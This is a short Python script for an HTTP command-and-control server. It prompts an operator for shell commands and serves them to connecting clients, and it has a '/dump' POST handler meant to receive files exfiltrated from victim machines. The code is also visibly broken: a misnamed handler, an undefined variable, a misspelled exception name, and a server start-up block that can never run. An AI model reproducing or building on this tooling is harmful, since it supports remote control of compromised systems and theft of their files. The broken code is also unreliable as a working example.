import http.server
import os,cgi
host=input("enter the ip:")
port=int(input("enter the port no:"))
class RequestHandler(http.server.BaseHTTPRequestHandler):
	def do_GET(self):
		command=input("shell>")
		self.send_response(200)
		self.send_header("content-type","text/html")
		self.end_headers()
		self.wfile.write(command.encode()) #contains an o/p stream for writing a response back to client
	def do_Post(self):
		if self.path=='/dump':
			try:
				ctype,pdict=cgi.parse_header(self.headers.get('content-type'))
				if ctype== 'multipart/form-data':
					fs=cgi.FieldStorage(fp=self.rfile,headers=self.headers,environ={'REQUEST_METHOD':'POST'})
				else:
					print("[-] not here")
					fs_up=fs['file']
					with open('/root/Desktop/place_holder.txt','wb') as o:
						print('[+] writing the file')
						o.write(fs_up.file.read())
						self.send_response(200)
						self.end_headers()
			except Exeption as e:
					print(e)
					return
					self.send_response(200)
					self.end_headers()
					length=int(self.end_headers['content-length'])
					postVar=self.rfile.read(length)
					print(postVar.decode())
					if __name__=='__main__':
						server_class=http.server.HTTPServer
						httpd=server_class((host,port),RequestHandler)
						try:
							httpd.serve_forever()
						except KeyboardInterrupt:
							print("[-] server closed")
							http.server_close()
							
						